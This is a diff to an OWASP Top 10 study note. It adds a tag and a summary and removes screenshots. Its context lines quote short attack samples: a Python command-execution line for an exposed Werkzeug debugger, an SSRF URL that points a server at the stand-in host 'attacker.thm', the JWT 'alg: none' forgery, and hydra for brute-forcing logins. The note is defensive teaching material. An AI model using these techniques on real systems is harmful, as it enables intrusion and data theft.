@@ -5,6 +5,7 @@ tags:
   - tree/appsec
   - cyber/web/owasp
   - type/concept
+  - difficulty/medium
   - level/apprentice
 Domain:
   - "[[Standards & API]]"
@@ -27,8 +28,6 @@ Color: "#911EB4"
 ## A01 Broken Access Control
 
 **#1 by prevalence.** Access control enforces *what an authenticated user is allowed to do*. It's **broken** when a user can act outside their intended permissions — the gap between **authentication** ("who are you?") and **authorization** ("what may you do?").
-
-![[Pasted image 20251107162932.png]]
 
 Failure modes an assessor tests:
 - **Horizontal** — reach another user's data at the same privilege level (**IDOR**).
@@ -97,8 +96,6 @@ The distinction from **** matters: misconfiguration is a control that *exists bu
 
 The system *could* have been secured but wasn't: default credentials, unnecessary features/ports/accounts enabled, verbose error messages/stack traces, missing [security headers](https://owasp.org/www-project-secure-headers/), permissive CORS, and — dangerously — **exposed debug interfaces**.
 
-![[Pasted image 20251107182407.png]]
-
 The 2015 **Patreon** breach came from an exposed **Werkzeug debug console** (reachable at `/console`, or auto-shown on an unhandled exception), which runs arbitrary Python:
 ```python
 import os; print(os.popen("ls -l").read())     # RCE via a forgotten debugger
@@ -129,8 +126,6 @@ The challenge is *transitive* dependencies (a library your library uses) and *re
 
 Weaknesses in verifying *who* the user is: brute-forceable logins, weak/credential-stuffed passwords, predictable or non-rotated session tokens, and broken account-management logic.
 
-![[Pasted image 20251107201201.png]]
-
 Authentication issues an assessor probes:
 - **Brute force / credential stuffing** — no lockout or rate limit on login; test with **hydra**.
 - **Weak session cookies** — predictable/sequential IDs let an attacker set their own; no rotation after login enables **session fixation**.
@@ -153,19 +148,12 @@ Trusting code or data whose **integrity you can't verify** — a category that g
         integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
         crossorigin="anonymous"></script>
 ```
-![[Pasted image 20251107212452.png]]
 
 **Data integrity** — trusting client-tamperable data. Storing a raw `username` in a cookie lets a user rewrite it and impersonate anyone:
 
-![[Pasted image 20251107212829.png]]
-
 The fix is an integrity-protected token — a **JWT**, whose signature (keyed by a server-only secret) proves the payload wasn't altered:
 
-![[Pasted image 20251107213223.png]]
-
 But JWTs introduce their own integrity failure — the **`alg: none`** downgrade: set `alg` to `none`, drop the signature, and vulnerable libraries accept it, letting you forge `"admin":true`:
-
-![[Pasted image 20251107213607.png]]
 
 > **Secure design:** **SRI** for external scripts, **signed & verified** update/CI pipelines and container images, digital signatures on serialized data, and never trust client-side data for authorization. Full JWT attack set: **Web Fundamentals (JWT Security)**; deserialization: **Web Exploitation (Insecure Deserialisation)**.
 
@@ -185,8 +173,6 @@ What *should* be logged: login success/failure, access-control denials, input-va
 
 **SSRF** coerces the *server* into making attacker-chosen requests — reaching internal services the attacker can't touch directly, because the request originates from inside the trust boundary.
 
-![[Pasted image 20251107222034.png]]
-
 Classic case — a `server`/`url` parameter the app forwards to:
 ```
 https://mysite.com/sms?server=attacker.thm&msg=ABC
@@ -200,6 +186,14 @@ SSRF escalates far beyond a leaked key: **enumerate internal networks/ports**, h
 > **Secure design:** **allow-list** permitted destinations (not a deny-list of "bad" ones), block requests to internal/link-local ranges (`169.254.0.0/16`, RFC 1918), disable unused URL schemes, never reflect raw responses to the user, and require IMDSv2 on cloud metadata.
 
 ---
+
+## Summary
+
+You should now be able to:
+
+- Name each of the OWASP Top 10 categories and state the mechanism behind it, not just its title.
+- Recognise the highest-impact web risks — broken access control, cryptographic failures, injection and SSRF — in real code.
+- State the primary control for each category and explain why it addresses the cause rather than the symptom.
 
 ## 🔗 Related Master Notes & Deep-Dives
 - **2.3 Web Exploitation** — hands-on exploitation of these categories
